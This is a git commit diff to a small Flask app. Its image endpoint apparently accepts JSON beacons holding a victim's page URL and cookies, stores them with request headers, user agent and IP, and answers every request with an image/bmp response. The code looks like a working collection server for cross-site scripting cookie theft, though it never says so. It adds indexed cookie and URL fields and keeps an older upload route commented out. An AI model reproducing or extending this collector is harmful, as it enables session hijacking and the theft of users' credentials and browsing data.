aace356aaae7f9cda741c659778e125d47e28618
Mike Chen <ccp0101@gmail.com>
2012-10-07 16:32:52 +0800

    update model and order asc

--- models.py
+++ models.py
@@ -7,40 +7,37 @@ import json
 import logging
 
 
-class RawUpload(db.Model):
+class Upload(db.Model):
     data = TextField()
-    is_xhr = BooleanField()
-    remote_ip = CharField(max_length=64)
+    is_xhr = BooleanField(db_index=True)
+    remote_ip = CharField(max_length=64, db_index=True)
     headers = TextField()
-    created = DateTimeField(default=datetime.now)
+    created = DateTimeField(default=datetime.now, db_index=True)
+    url = TextField(db_index=True)
+    cookie = TextField()
+    useragent = TextField()
 
     def __unicode__(self):
         return self.data
 
+    class Meta:
+        ordering = (('created', 'asc'),)
 
-class RawUploadResource(RestResource):
+
+class UploadResource(RestResource):
     def prepare_data(self, obj, data):
-        d = data.get('data', '')
-        try:
-            j = json.loads(d)
-        except Exception as e:
-            logging.info("Cannot parse JSON '%s': %s" % (d, e))
-            return None
         del data['is_xhr']
         del data['data']
 
         h = request.args.get('headers', None)
         if not h:
             del data['headers']
-        data['cookie'] = j.get('cookie', None)
-        data['url'] = j.get('url', None)
         utc_8 = obj.created + timedelta(hours=8)
         data['created'] = utc_8.strftime("%Y-%m-%d (%a) %H:%M:%S")
         return data
 
-
-RawUpload.create_table(fail_silently=True)
+Upload.create_table(fail_silently=True)
 
 api = RestAPI(app)
-api.register(RawUpload, RawUploadResource)
+api.register(Upload, UploadResource)
 api.setup()
--- views.py
+++ views.py
@@ -1,7 +1,8 @@
 from app import app
 from flask import request
-from models import RawUpload
+from models import Upload
 from flask import Response
+import json
 
 
 @app.route('/')
@@ -15,19 +16,28 @@ def img():
     if data is None:
         return Response("missing data", mimetype='image/bmp')
     else:
-        row = RawUpload.create(data=data, is_xhr=request.is_xhr,
+        try:
+            j = json.loads(data)
+        except Exception as e:
+            return Response("Cannot parse: %s" % e, mimetype='image/bmp')
+
+        url = j.get('url', '')
+        cookie = j.get('cookie', '')
+
+        row = Upload.create(data=data, is_xhr=request.is_xhr,
             headers=unicode(request.headers),
+            url=url, cookie=cookie, useragent=request.user_agent.string,
             remote_ip=request.headers.get('X-Forwarded-For', request.remote_addr))
         return Response("ok", mimetype='image/bmp')
 
 
-@app.route('/upload/', methods=['POST', ])
-def upload():
-    data = request.form.get('d', None)
-    if data is None:
-        return "missing data"
-    else:
-        row = RawUpload.create(data=data, is_xhr=request.is_xhr,
-            headers=unicode(request.headers),
-            remote_ip=request.headers.get('X-Forwarded-For', request.remote_addr))
-        return "ok"
+# @app.route('/upload/', methods=['POST', ])
+# def upload():
+#     data = request.form.get('d', None)
+#     if data is None:
+#         return "missing data"
+#     else:
+#         row = Upload.create(data=data, is_xhr=request.is_xhr,
+#             headers=unicode(request.headers),
+#             remote_ip=request.headers.get('X-Forwarded-For', request.remote_addr))
+#         return "ok"
